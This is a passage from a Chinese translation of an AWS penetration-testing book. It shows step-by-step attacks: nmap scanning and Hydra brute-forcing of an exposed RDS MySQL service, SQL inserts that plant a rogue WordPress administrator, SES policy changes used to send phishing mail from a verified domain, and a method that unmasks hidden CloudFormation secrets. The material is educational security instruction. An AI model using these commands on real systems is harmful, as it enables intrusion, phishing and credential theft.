![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/0f463258-a025-4cea-ae6c-0d602186390d.jpg)

1.  让我们找出端口`3306`上运行的服务：

```
sudo nmap -sS -A -vv -Pn -sV -p 3306 <<RDS Instance>>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f653b623-9e31-41d0-a4ea-47475ee6e905.jpg)

1.  所以，这是一个 MySQL 服务。让我们使用**Nmap 脚本** **引擎**（**NSE**）脚本找出有关 MySQL 服务的更多信息：

```
sudo nmap -sS -A -vv -Pn -sV -p 3306 --script=mysql-info,mysql-enum <<RDS Instance>>
```

1.  出现了相当多的信息，特别是一组有效的用户名，比如`admin`。这在我们的下一节中将至关重要：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/9d63c96e-cf0b-4bbe-812a-a09508e39ecb.jpg)

我们已经确定了我们的目标并找到了一些信息，比如哪些端口是打开的，正在运行什么服务以及正在运行什么数据库服务器。此外，我们还找到了一组有效用户名的关键数据。在下一节中，我们将看到可以使用这些数据执行哪些攻击。

# 从易受攻击的 RDS 实例中利用和提取数据

我们现在发现了一个 RDS 实例，其 MySQL 服务正在公开监听。我们还确定了一组有效的用户名。

我们的下一步是对我们的`admin`用户进行暴力破解登录和有效密码。

在这个练习中，我们将使用 Hydra 来暴力破解 MySQL 服务并找到密码：

1.  在您的 Kali 实例上，下载用于暴力破解攻击的单词列表字典；我发现`rockyou.txt`是足够的。然后，发出以下命令：

```
hydra -l admin -P rockyou.txt <RDS IP Address> mysql
```

1.  Hydra 将使用提供的单词列表对服务进行暴力破解，并为您提供有效的密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a9b7cc72-fbfd-4ddf-87ad-b6f617b30494.jpg)

一旦我们有了有效的凭据，就该连接到 MySQL 服务并为 WordPress 创建一个新用户。

为了破坏 WordPress 安装，我们将为 WordPress 创建一个新的管理员用户，然后使用这些凭据登录：

1.  再次从您的 Kali 机器连接到 MySQL 服务，使用我们发现的密码：

```
mysql -h <<RDS Instance name>> -P 3306 -u admin -p
```

为了添加一个新用户，我们将不得不在数据库的`wp_users`表中添加一行。

1.  首先，将数据库更改为 WordPress 正在使用的数据库：

```
use newblog;
```

1.  现在按照以下方式列出表格：

```
show tables;
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/82545061-cf71-4124-a074-254276c7ed67.jpg)

我们可以看到`wp_users`表；现在是时候向其中添加一行新数据了。

1.  对于本教程，我们正在创建一个名为`newadmin`的用户，密码为`pass123`。发出以下命令：

```
INSERT INTO `wp_users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`)
VALUES ('newadmin', MD5('pass123'), 'firstname lastname', 'email@example.com', '0');

INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) 
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');

INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) 
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_user_level', '10');
```

1.  现在访问`http://<<EC2 IP 地址>>/wp-login.php`登录页面。输入新的凭据，您将以新的管理员身份登录。

# 总结

在本章中，我们学习了 RDS 实例是什么，以及如何创建 RDS 实例。然后我们在 EC2 机器上设置了一个 WordPress 网站，然后配置它使用 RDS 实例作为数据库服务器。我们看到了 RDS 实例如何变得容易受攻击。此外，我们使用 Nmap 和 Hydra 来识别和利用易受攻击的 RDS 实例。最后，我们学习了如何篡改 RDS 实例的数据以创建一个新的 WordPress 用户。

在下一章中，我们将学习如何对其他各种 AWS API 进行渗透测试。

# 进一步阅读

+   **使用 ncrack、hydra 和 medusa 进行暴力破解密码**：[`hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/`](https://hackertarget.com/brute-forcing-passwords-with-ncrack-hydra-and-medusa/)

+   **在 Amazon RDS 中配置安全性**：[`docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.html`](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/UsingWithRDS.html)

+   **加密 Amazon RDS 资源**：[`docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html`](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html)


# 第十四章：针对其他服务

AWS 提供了各种各样的服务，并且不断更新这些服务，同时发布新的服务。这本书不可能覆盖所有这些服务，但本章旨在介绍一些不太主流的服务以及它们如何被滥用以使我们作为攻击者受益。

需要注意的是，每个 AWS 服务都有可能存在某种利用方式，当将其视为攻击者时，这本书没有涵盖的服务并不意味着您不应该调查它。每项服务都可能出现各种安全问题，因此最好的做法是查看服务并确定它在现实世界中的使用方式，然后寻找常见的错误、不安全的默认设置或者只是为了使自己受益而遵循的不良实践。

本章将介绍的四种不同服务包括 Route 53，一个可扩展的 DNS/域管理服务；**简单邮件服务**（**SES**），一个托管的电子邮件服务；CloudFormation，一个基础设施即代码服务；以及**弹性容器注册表**（**ECR**），一个托管的 Docker 容器注册表。

在本章中，我们将涵盖以下主题：

+   Route 53

+   SES

+   CloudFormation

+   ECR

# Route 53

Route 53 是一个很好的服务，有几个不同的原因值得花时间研究。主要原因是侦察，因为它允许我们关联 IP 和主机名，并发现域和子域，这就是我们要在这里介绍的内容。它也是一项非常有成效的服务，用于一些更恶意的攻击，我们不会深入讨论，因为它们对于我们作为渗透测试人员来说没有用处，但我们会在最后介绍它们，以让您意识到一旦获得访问权限，真正的恶意黑客可能会尝试做些什么。

# 托管区域

我们首先要做的是获取 Route 53 中托管区域的列表。我们可以使用以下 AWS CLI 命令收集这些信息（我们可以在 Route 53 中省略`--region`参数）：

```
aws route53 list-hosted-zones
```

输出应该看起来像这样：

```
{
    "HostedZones": [
        {
            "Id": "/hostedzone/A22EWJRXPPQ21T",
            "Name": "test.com.",
            "CallerReference": "1Y89122F-2364-8G1E-P925-2B8OO1338Z31",
            "Config": {
                "Comment": "An example Hosted Zone",
                "PrivateZone": false
            },
            "ResourceRecordSetCount": 5
        }
    ]
}
```

因此，我们发现了一个公共托管区域（我们可以看到`"PrivateZone"`设置为`false`），并且在其中创建了五个记录集（因为`"ResourceRecordSetCount"`为`5`）。接下来，我们可以使用`ListResourceRecordSets`命令来查看为`"test.com"`托管区域设置了哪些记录：

```
aws route53 list-resource-record-sets --hosted-zone-id A22EWJRXPPQ21T
```

响应可能会相当长，取决于有多少记录集。它应该包括一个`"ResourceRecordSets"`列表，其中包括名称、类型、**生存时间**（**TTL**）和资源记录列表。这些记录可以是任何类型的 DNS 记录，例如 A 记录、**规范名称**（**CNAME**）记录和**邮件交换器**（MX）记录。这些记录集列表可以与来自 EC2 之类的已知 IP 地址进行比较，以便您可以发现与您可以访问的某些服务器相关的主机名，甚至发现未知的 IP、域和子域。

这很有用，因为许多 Web 服务器在直接访问服务器的 IP 地址时无法正确加载，因为它需要主机名，我们可以使用 Route 53 来找出并正确解析。

这在查看 Route 53 中的私有托管区域时也很有用，可以帮助您发现内部网络中可用的主机和 IP，一旦获得访问权限。

Route 53 中可能发生许多恶意攻击，因此重要的是对这项服务的访问进行严格限制。这些类型的攻击可能不会在渗透测试中使用，但对于你和你的客户的安全来说，了解这些攻击是很重要的。最简单的攻击可能就是改变与 A 记录相关的 IP 地址，这样任何访问该域的用户（例如`test.com`）都会被重定向到你自己的攻击者 IP 地址，然后你可以尝试网络钓鱼或其他各种攻击。相同的攻击也可以适用于 CNAME 记录，只需将你目标的子域指向你自己的攻击者托管的网站。当你控制一个网站的 DNS 记录时，可能有无穷无尽的可能性，但要小心不要搞砸并对你正在测试的 AWS 环境造成严重问题。

# 域名

Route 53 支持注册各种顶级域的新域名。作为攻击者，你理论上可以使用目标 AWS 账户注册一个新域名，然后将该域名转移到另一个提供商进行管理，在那里你可以为任何你想要的东西创建一个一次性网站。这可能永远不会在渗透测试期间执行，只会用于恶意目的。

# 解析器

Route 53 DNS 解析器可用于在使用中的不同网络和 VPC 之间路由 DNS 查询。作为攻击者，这可能为我们提供有关未在 AWS 中托管的其他网络或可能在 VPC 内的服务的见解，但通常对这些服务的实际攻击只会用于恶意目的，而不是我们作为渗透测试人员所希望的。

# 简单电子邮件服务（SES）

SES 是一个小巧但实用的服务，允许管理从你拥有的域和电子邮件账户发送和接收电子邮件，但作为拥有 SES 访问权限的攻击者，我们可以利用这项服务进行信息收集和社会工程。根据你受损用户对 SES 的访问权限以及已注册的不同验证域/电子邮件账户的相关设置，它可以允许对我们目标公司的员工和客户进行一些严重的网络钓鱼和社会工程。

# 网络钓鱼

我们将假设我们受损的账户对 SES 拥有完全访问权限，以便我们可以进行所有攻击，但根据你在现实场景中发现的访问权限的类型，可能需要进行调整。我们首先要做的是查找已验证的域和/或电子邮件地址。这些可能被隔离到单个区域或在几个不同的区域之间分开，因此在运行这些 API 调用时检查每个区域是很重要的。我们可以通过运行以下 AWS CLI 命令来发现这些已验证的域/电子邮件地址，以获取`us-west-2`区域的信息：

```
aws ses list-identities --region us-west-2
```

输出将包含已添加到该区域的域和电子邮件地址，无论它们的状态如何。域/电子邮件地址的状态表示它是否已验证、待验证、验证失败等等，域/电子邮件地址必须在可以与 SES 提供的其他功能一起使用之前进行验证。这是为了确认设置它的人拥有他们正在注册的东西。该命令的输出应该类似于以下内容：

```
{
    "Identities": [
        "test.com",
        "admin@example.com"
    ]
}
```

如果通过 SES 设置和验证了电子邮件地址，那么它就可以单独用于发送/接收电子邮件，但是如果设置和验证了整个域，那么该域的任何子域中的任何电子邮件地址都可以使用。这意味着如果`test.com`被设置和验证，可以从`admin@test.com`、`admin@subdomain.test.com`、`test@test.com`或任何其他变体发送电子邮件。这是攻击者喜欢看到的，因为我们可以根据需要定制我们的网络钓鱼攻击。这些信息可能很有帮助，因为我们可能能够发现以前不知道的电子邮件/域，从而更容易制定看起来真实的网络钓鱼攻击。

接下来，一旦我们找到了已验证的域名和/或电子邮件地址，我们将希望确保在同一区域中启用了电子邮件发送。我们可以使用以下 AWS CLI 命令检查：

```
aws ses get-account-sending-enabled --region us-west-2
```

这应该返回`True`或`False`，取决于`us-west-2`区域是否启用了电子邮件发送。如果发送被禁用，没有其他已验证域名/电子邮件帐户的区域，并且我们具有`"ses:UpdateAccountSendingEnabled"`权限，我们可以使用该权限重新启用发送，以便执行我们的网络钓鱼攻击。以下命令将实现这一点：

```
aws ses update-account-sending-enabled help --enabled --region us-west-2
```

但是，在他人的环境中运行此命令时要小心，因为可能出于非常特定的原因禁用了发送，再次启用可能会导致未知问题。如果此命令成功，AWS CLI 不会做出任何响应；否则，您将看到一个解释问题的错误。

接下来，我们需要确认该区域中的域名/电子邮件地址是否已验证，可以使用以下命令完成：

```
aws ses get-identity-verification-attributes --identities admin@example.com test.com
```

我们应该收到一个响应，指示`"admin@example.com"`和`"test.com"`是否已验证。输出应该如下所示：

```
{
    "VerificationAttributes": {
        "test.com": {
            "VerificationStatus": "Pending",
            "VerificationToken": "ZRqAVsKLn+Q8hY3LoADDuwiKrwwxPP1QGk8iHoo+D+5="
        },
        "admin@example.com": {
            "VerificationStatus": "Success"
        }
    }
}
```

正如我们所看到的，`"test.com"`仍在等待验证，因此我们不能用它发送电子邮件，但`admin@example.com`已成功验证。

因此，我们已经找到了在启用发送的区域中成功验证的身份；现在我们需要检查其身份策略。我们可以使用以下命令完成：

```
aws ses list-identity-policies --identity admin@example.com
```

如果返回一个空的策略名称列表，那么这意味着没有策略应用于此身份，这对我们来说是个好消息，因为对于此身份的使用没有限制。如果应用了策略，其名称将显示在响应中，这意味着我们需要跟进使用`GetIdentityPolicies`命令：

```
aws ses get-identity-policies --identity admin@example.com --policy-names NameOfThePolicy
```

这应该返回一个 JSON 文档，指定了我们指定的身份(`admin@example.com`)可以做什么。就像我们过去看到的那样，这个 JSON 策略将作为一个转义字符串返回给我们，放在另一个 JSON 对象中。该策略应该看起来像这样（将其从转义字符串转换为真正的 JSON 对象以便更容易查看）：

```
{
    "Version": "2008-10-17",
    "Statement": [
        {
            "Sid": "stmt1242527116212",
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:iam::000000000000:user/ExampleAdmin"
            },
            "Action": "ses:SendEmail",
            "Resource": "arn:aws:ses:us-west-2:000000000000:identity/admin@example.com"
        }
    ]
}
```

这向我们表明，具有`"arn:aws:iam::000000000000:user/ExampleAdmin"` ARN 的 IAM 用户是唯一可以使用`admin@example.com`发送电子邮件的实体。这是一个我们需要通过修改此策略来提升我们权限的情况的示例，因为即使我们具有`"ses:SendEmail"`权限，该策略也阻止我们使用它（因为我们假设我们不是`ExampleAdmin` IAM 用户）。

为了实现这一点，我们需要修改该策略，将我们自己的用户添加为受信任的主体。为了添加我们自己，我们只需要将 Principal | AWS 的值更改为一个数组，然后将我们自己的用户的 ARN 添加为受信任的主体。这样做之后，策略应该如下所示：

```
{
    "Version": "2008-10-17",
    "Statement": [
        {
            "Sid": "stmt1242577186212",
            "Effect": "Allow",
            "Principal": {
                "AWS": [
                    "arn:aws:iam::000000000000:user/ExampleAdmin",
                    "arn:aws:iam::000000000000:user/CompromisedUser"
                ]
            },
            "Action": "ses:SendEmail",
            "Resource": "arn:aws:ses:us-west-2:000000000000:identity/admin@example.com"
        }
    ]
}
```

在此策略中，我们已授予`"CompromisedUser"`IAM 用户访问权限，我们假设这是我们在渗透测试中受到影响的用户。另一个选择是允许访问您自己的 AWS 帐户，因为 SES 身份策略支持跨帐户发送电子邮件，因此在添加您其他帐户的 ARN 后，您甚至不需要目标帐户的凭据。

我们可以使用 SES `PutIdentityPolicy` API 更新此策略。

```
aws ses put-identity-policy --identity admin@example.com --policy-name NameOfThePolicy --policy file://ses-policy-document.json
```

`ses-policy-document.json`文件包括我们之前添加的受损用户信任的 JSON。如果更新成功，将不会有任何输出；否则，错误将解释发生了什么。

如果成功，那么我们基本上通过将自己添加为受信任的实体来提升了我们的 SES 身份权限。现在策略允许我们发送电子邮件，并且我们有`ses:SendEmail`权限，我们几乎准备好进行钓鱼了。

我们需要考虑的最后一件事是当前帐户是否仍在 SES 沙箱中。目前还没有一个很好的方法可以在 AWS CLI 中确定这一点，而不是尝试发送电子邮件，但如果您有 AWS Web 控制台访问权限，那么您将能够找到这些信息。SES 沙箱限制发送电子邮件到您已验证的电子邮件帐户/域之外的任何电子邮件帐户/域。通常，您只能从 SES 中的已验证电子邮件帐户/域发送电子邮件，但如果您的帐户仍在 SES 沙箱中，那么您只能从已验证的电子邮件帐户/域发送电子邮件，并且只能发送到已验证的电子邮件帐户/域。这意味着，在我们的演示帐户中，如果它仍然在 SES 沙箱中，我们只能从`admin@example.com`发送电子邮件到`admin@example.com`。必须手动请求解除此限制，因此如果您遇到正在使用 SES 的帐户，很可能会发现他们已经出于自己的业务需求而脱离了 SES 沙箱。

如果您发现一个仍然在 SES 沙箱中但已经验证了域身份的帐户，这意味着您仍然可以从该域的任何电子邮件帐户发送电子邮件到该域的任何电子邮件帐户，这意味着您可能仍然可以滥用这种访问权限来对员工进行内部钓鱼攻击。

如果您使用受损的帐户访问 AWS Web 控制台，可以通过访问 SES 控制台的发送统计页面来检查沙箱访问权限。您需要检查您发现已验证身份的每个区域，以防一个区域仍然在沙箱中，而另一个区域不在。如果帐户仍然在沙箱中，您将在以下截图中看到以下消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b7df4642-48dd-4555-9868-db947bf04b0a.png)

此截图中的 AWS 帐户仍受限于 us-west-2 的沙箱

当您准备开始发送钓鱼邮件时，值得查看目标可能在其 SES 配置中保存的任何电子邮件模板。这可以让您了解此电子邮件帐户通常在发送电子邮件时使用的格式，以及通常发送的内容类型。您并不总是会在 SES 中找到保存的模板，但当您找到时，它们可能非常有用。我们可以使用`ListTemplates` API 查找任何现有模板：

```
aws ses list-templates --region us-west-2
```

然后我们可以使用`GetTemplate` API 来查看内容：

```
aws ses get-template --template-name TheTemplateName --region us-west-2
```

然后，我们可以围绕一个看起来有希望的模板构建我们的钓鱼邮件。

当所有这些都说完了，我们最终可以使用 SES `SendEmail` API 发送我们的网络钓鱼邮件。有关设置 CLI 发送电子邮件的更多信息，请参阅 SES 文档中的指南：[`docs.aws.amazon.com/cli/latest/reference/ses/send-email.html`](https://docs.aws.amazon.com/cli/latest/reference/ses/send-email.html)。现在，我们已经成功从合法域名发送了网络钓鱼邮件，使用了合法的模板，几乎可以肯定地欺骗一些最终用户/员工透露敏感信息。

# 其他攻击

即使我们无法使用 SES `SendEmail` API，或者我们不想吸引防御者的注意，如果他们使用电子邮件模板，我们仍然可以滥用 SES 进行网络钓鱼。我们可以使用 SES `UpdateTemplate` API 来更新 SES 中已创建的电子邮件模板的文本/HTML。作为攻击者，我们可以利用这一点基本上建立后门网络钓鱼电子邮件。假设 Example Co.使用 SES 模板发送营销电子邮件。作为攻击者，我们可以进入并修改特定模板，插入恶意链接和内容。然后，每当`Example Co.`发送他们的营销电子邮件时，我们的恶意链接和内容将被包含在内，大大增加我们的攻击成功的几率。

可以执行的另一个攻击是设置一个收据规则，确定对已验证的电子邮件/域名的传入电子邮件的处理方式。通过使用 SES `CreateReceiptRule` API，我们可以设置一个收据规则，将所有传入的消息发送到我们攻击者帐户中的自己的 S3 存储桶，然后我们可以读取敏感内容，或者使用收据规则支持的其他选项，如触发 Lambda 函数。

# 攻击所有 CloudFormation

CloudFormation 是一个非常有用的服务，最近已经成熟了很多。它基本上让你编写代码，然后将其转换为 AWS 资源，使您可以轻松地启动和关闭资源，并从一个中央位置跟踪这些资源。CloudFormation 似乎遇到了一些常规源代码的问题，包括硬编码的秘密，过度宽松的部署等，我们将在这里进行介绍。

在渗透测试 CloudFormation 时有很多要注意的事情。以下列表是我们将在本节中涵盖的内容：

+   堆栈参数

+   堆栈输出值

+   堆栈终止保护

+   已删除的堆栈

+   堆栈导出

+   堆栈模板

+   传递的角色

对于这一部分，我们已经启动了一个简单的 LAMP 堆栈，基于简单的 LAMP 堆栈 CloudFormation 示例模板，但进行了一些修改。

我们要做的第一件事是使用 CloudFormation `DescribeStacks` API 来收集每个区域的堆栈信息。同样，这些 API 是按区域划分的，因此可能需要在每个区域运行它们，以确保发现所有的堆栈。我们可以通过运行以下 AWS CLI 命令来实现这一点：

```
aws cloudformation describe-stacks --region us-west-2
```

这个命令的好处是它将为每个堆栈返回我们想要查看的多个内容。

# 参数

我们将要检查的第一条有趣信息是存储在`"Parameters"`下的内容。可用参数在堆栈模板中定义，然后在使用该模板创建新堆栈时传递值。这些参数的名称和值与关联的堆栈一起存储，并显示在`"Parameters"`键下的 DescribeStacks API 调用响应中。

我们希望找到一些敏感信息被传递到参数中，然后我们可以使用它来进一步访问环境。如果遵循最佳实践，那么理想情况下我们不应该能够在堆栈的参数值中找到任何敏感信息，但我们发现最佳实践并不总是被遵循，某些敏感值偶尔会被漏掉。最佳实践是在定义 CloudFormation 模板中的参数时使用`NoEcho`属性，这可以防止传递给该参数的值被回显给运行`DescribeStacks` API 调用的任何人。如果使用`NoEcho`并将其设置为`true`，那么在描述堆栈时该参数仍将显示在`Parameters`下，但其值将被用几个``"*"``字符进行屏蔽。

对于我们为此演示创建的堆栈，返回以下参数：

```
"Parameters": [
    {
        "ParameterKey": "KeyName",
        "ParameterValue": "MySSHKey"
    },
    {
        "ParameterKey": "DBPassword",
        "ParameterValue": "aPassword2!"
    },
    {
        "ParameterKey": "SSHLocation",
        "ParameterValue": "0.0.0.0/0"
    },
    {
        "ParameterKey": "DBName",
        "ParameterValue": "CustomerDatabase"
    },
    {
        "ParameterKey": "DBUser",
        "ParameterValue": "****"
    },
    {
        "ParameterKey": "DBRootPassword",
        "ParameterValue": "aRootPassW0rd@1!"
    },
    {
        "ParameterKey": "InstanceType",
        "ParameterValue": "t2.small"
    }
]
```

从这些信息中我们可以得出一些不同的东西。一些基本的信息收集让我们看到有一个名为``"MySSHKey"``的 SSH 密钥正在使用，允许从``"0.0.0.0/0"``进行 SSH 访问，有一个名为``"CustomerDatabase"``的数据库，以及一个``"t2.small"``类型的 EC2 实例。除此之外，我们还看到一些数据库密码和数据库用户名。

我们可以看到``DBUser``的值为``"****"``，这很可能意味着`DBUser`参数已经将``"NoEcho"``设置为`true`，因此在尝试从中读取时其值将被屏蔽。`DBUser`的值也可能是``"****"``，但可以通过查看堆栈的模板来轻松确认这一点，我们可以在那里审查为`DBUser`参数设置的约束和属性。

由于``"DBPassword"``和``"DBRootPassword"``下的`明文`值，我们知道设计这个 CloudFormation 模板的人犯了一些错误。他们忘记为这两个参数设置``"NoEcho"``，因此每当有人描述当前堆栈时，`明文`密码都会被返回。这对我们攻击者来说是好事，因为现在我们有了常规数据库用户和数据库根用户的`明文`密码。我们可以再次分析模板，找出这个数据库可能在哪里或者我们如何访问它，但我们稍后会到达那里。

除了`明文`密码之外，我们还看到``"SSHLocation"``被设置为``0.0.0.0/0``，我们可以假设这意味着某个服务器被设置为允许来自该 IP 范围的 SSH 访问，这意味着任何人都可以访问 SSH 服务器，因为`0.0.0.0/0`代表所有存在的 IPv4 地址。这对我们来说也是有用的信息，因为也许我们将能够利用服务器上过时的 SSH 软件来获取访问权限或类似的东西。

# 输出值

接下来，我们将要检查在之前描述 CloudFormation 堆栈时在``Outputs``下的值。我们正在查看与``"Parameters"``中基本相同的东西，但这些值是在堆栈创建过程中生成的。同样，我们要寻找敏感信息。对于某些堆栈可能没有输出值，因此如果遇到这种情况，我们在演示的这部分中就没有什么可看的了。在我们的演示中，当我们描述它时，这是显示在堆栈的`Outputs`部分下的内容：

```
"Outputs": [
    {
        "OutputKey": "WebsiteURL",
        "OutputValue": "http://ec2-34-221-86-204.us-west-2.compute.amazonaws.com",
        "Description": "URL for newly created LAMP stack"
    }
]
```

正如我们所看到的，这里没有太敏感的东西，但它确实给了我们一个 EC2 实例的公共端点，很可能是在创建堆栈时创建的。鉴于``"SSHLocation"``参数被设置为`0.0.0.0/0`，我们很可能会在这台服务器上找到一个开放的 SSH 端口（`22`）。我们可以使用`nmap`运行服务扫描（`-sV`）来验证这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/91e1c7a2-d9ea-45cd-b312-41f4989f5af2.png)

22 端口被发现是开放的，并且运行着 OpenSSH 版本 7.4

我们已经验证了服务器上有一个开放的 SSH 端口，就像我们预期的那样。仅通过查看 CloudFormation 堆栈的输出值，我们就能够识别出这个 EC2 实例的公共端点，该端点的端口`22`是“开放”的，运行着一个 SSH 服务器。

输出值可能包含敏感信息，例如凭据或 API 密钥。例如，当模板需要为新的 IAM 用户创建一组访问密钥时，这可能会发生。然后，这些访问密钥可能会显示在堆栈的输出值中，因为在创建堆栈后，用户需要某种方式来访问它们（https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/quickref-iam.html#scenario-iam-accesskey）。这些密钥可能会使我们能够进一步访问环境，以期提升我们已有的权限。

# 奖励-发现 NoEcho 参数的值

正如我们之前讨论的那样，使用参数上的`NoEcho`属性可以防止在使用 DescribeStacks API 时显示其值，以便敏感值不会暴露给可以调用该 API 的任何用户。有时（大多数情况下），具有`NoEcho`属性设置为`true`的值对我们作为攻击者可能是有用的，因为通常它们可能是密码或 API 密钥。但并非一无所获，因为在拥有适当权限的情况下，您可以揭示用于部署账户中存在的 CloudFormation 堆栈的那些参数的值。

为此，您至少需要具有`cloudformation:UpdateStack`权限。如果我们想要从先前提到的演示堆栈中揭示`NoEcho`参数`DBUser`，我们首先需要使用`GetTemplate`API 命令下载该堆栈的模板。如果我们没有`GetTemplate`权限，我们可以创建自己的模板，但这实际上会删除堆栈创建的每个资源，而我们没有包含在自定义模板中，因此我们不会涉及到这一点。

将模板保存到当前目录中的`template.json`中，然后就像前一节一样，创建包含以下数据的`params.json`：

```
[
    {
        "ParameterKey": "KeyName",
        "UsePreviousValue": true
    },
    {
        "ParameterKey": "DBPassword",
        "UsePreviousValue": true
    },
    {
        "ParameterKey": "DBUser",
        "UsePreviousValue": true
    },
    {
        "ParameterKey": "DBRootPassword",
        "UsePreviousValue": true
    }
]
```

这样我们就可以更新堆栈的模板，而不修改已传递的参数的值，包括`"DBUser"`。

然后，需要做的就是删除`DBUser`参数上的`"NoEcho"`属性，或将其设置为`false`。此时，如果我们尝试更新堆栈，我们可能会收到以下消息：

```
An error occurred (ValidationError) when calling the UpdateStack operation: No updates are to be performed.
```

这是因为 CloudFormation 没有识别`"NoEcho"`参数对`DBUser`的删除/更改。最简单的方法就是在模板的某个地方更改一些字符串。确保不会引起任何问题，比如在某些代码的注释中添加一个空格之类的。确保不要将其插入到某些配置中，这样在重新部署资源时不会引起任何问题。然后，我们可以运行与之前相同的命令来使用这个新模板更新堆栈：

```
aws cloudformation update-stack --stack-name Test-Lamp-Stack --region us-west-2 --template-body file://template.json --parameters file://params.json
```

现在，一旦堆栈更新完成，我们应该能够再次描述堆栈，并且可以访问之前在创建堆栈时输入的未经审查的值：

```
{
  "ParameterKey": "DBUser",
  "ParameterValue": "admin"
}
```

从运行 DescribeStacks 的部分输出中可以看出，`"DBUser"`的值已经被解除掩码，并且显示它被设置为`"admin"`的值。我们做到了所有这些，并且在不对环境造成任何干扰的情况下发现了秘密值，所以这对我们来说是双赢的。

# 终止保护

终止保护是一种可以启用的设置，它阻止 CloudFormation 堆栈被删除。要删除启用了终止保护的堆栈，您首先需要禁用它，然后尝试删除堆栈，这需要一组不同的权限，您可能没有这些权限。通常最好在 CloudFormation 堆栈上启用终止保护，因此，尽管它不会直接影响我们作为攻击者（除非我们试图删除所有内容），但检查每个堆栈的终止保护并将其作为环境中的潜在错误配置是很好的做法。要检查此值，我们仍然使用`DescribeStacks` API，但它要求我们在 API 调用中明确命名堆栈。我们的演示堆栈名为`Test-Lamp-Stack`，因此要确定该堆栈的终止保护设置，我们可以运行以下 AWS CLI 命令：

```
aws cloudformation describe-stacks --stack-name Test-Lamp-Stack --region us-west-2
```

结果应该与我们之前看到的类似，但它们将包括`EnableTerminationProtection`键，该键设置为`true`或`false`，指定了是否启用了终止保护。

# 删除的堆栈

CloudFormation 还允许您检查已删除的堆栈，但在 CLI 上的过程有点不同。从 AWS Web 控制台 CloudFormation 堆栈页面，有一个下拉框，允许您显示所有已删除的堆栈，就像下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f3304abb-0eb9-4acf-922e-32450f27eb84.png)

在 AWS Web 控制台上列出已删除的 CloudFormation 堆栈

从 CLI，我们首先需要运行 CloudFormation `ListStacks`命令，使用 AWS CLI 看起来像这样：

```
aws cloudformation list-stacks --region us-west-2
```

该命令将提供与`DescribeStacks`命令类似的输出，但它不太冗长。`ListStacks`命令还包括已删除的 CloudFormation 堆栈，可以通过查看特定堆栈的 StackStatus 键来识别，其中值将为`DELETE_COMPLETE`。

要获取有关已删除堆栈的更多详细信息，我们必须明确地将它们传递到`DescribeStacks`命令中。与活动堆栈不同，已删除的堆栈不能通过它们的名称引用，只能通过它们的唯一堆栈 ID 引用。唯一的堆栈 ID 只是`ListStacks`输出中`"StackId"`键下的值。它将是一个类似于这样格式的 ARN：

```
arn:aws:cloudformation:us-west-2:000000000000:stack/Deleted-Test-Lamp-Stack/23801r22-906h-53a0-pao3-74yre1420836
```

然后我们可以运行`DescribeStacks`命令，并将该值传递给`--stack-name`参数，就像这样：

```
aws cloudformation describe-stacks --stack-name arn:aws:cloudformation:us-west-2:000000000000:stack/Deleted-Test-Lamp-Stack/23801r22-906h-53a0-pao3-74yre1420836 --region us-west-2
```

该命令的输出应该看起来很熟悉，我们现在可以查看与已删除堆栈相关联的参数值和输出值。检查已删除的堆栈是否包含秘密信息非常重要，其中一个原因是，删除堆栈的原因可能是开发人员犯了错误，意外地暴露了敏感信息或类似情况。

# 导出

CloudFormation 导出允许您在不必担心引用其他堆栈的情况下共享输出值。任何导出的值也将存储在导出它的堆栈的`"outputs"`下，因此，如果您查看每个活动和已删除堆栈的输出值，您已经查看了导出。查看聚合导出列表可能会有所帮助，以查看每个堆栈可用的信息类型。这可能会更容易了解目标环境和/或 CloudFormation 堆栈的用例。要检索这些数据，我们可以使用 AWS CLI 的`ListExports`命令：

```
aws cloudformation list-exports --region us-west-2
```

输出将告诉您每个导出的名称和值以及导出它的堆栈。

# 模板

现在我们想查看用于创建我们看到的 CloudFormation 堆栈的实际模板。我们可以使用 CloudFormation `GetTemplate`命令来实现这一点。此命令的工作方式类似于`DescribeStacks`命令，我们可以将模板名称传递给`--stack-name`参数，以检索该特定堆栈的模板。如果要检索已删除堆栈的模板，也需要指定唯一的堆栈 ID 而不是名称。要获取我们的演示堆栈的模板，我们可以运行以下 AWS CLI 命令：

```
aws cloudformation get-template --stack-name Test-Lamp-Stack --region us-west-2
```

响应应包括用于创建我们命名的堆栈的 JSON/YAML 模板。

现在我们可以做一些事情，但手动检查模板是最有效的。在开始手动检查之前，对模板本身运行安全扫描可能是有用的，以尝试发现其中指定的资产中的任何安全风险。为此创建的一些工具旨在在**持续集成**（**CI**）/ **持续部署**（**CD**）环境中设置和使用，例如 Skyscanner 的`"cfripper"`（[`github.com/Skyscanner/cfripper/`](https://github.com/Skyscanner/cfripper/)）。在此示例中，我们将使用 Stelligent 的`"cfn_nag"`（[`github.com/stelligent/cfn_nag`](https://github.com/stelligent/cfn_nag)），它也可以针对包含 CloudFormation 模板的单个文件/目录运行。这些工具通常不会捕捉所有内容，但它们可以帮助识别某些不安全的配置。

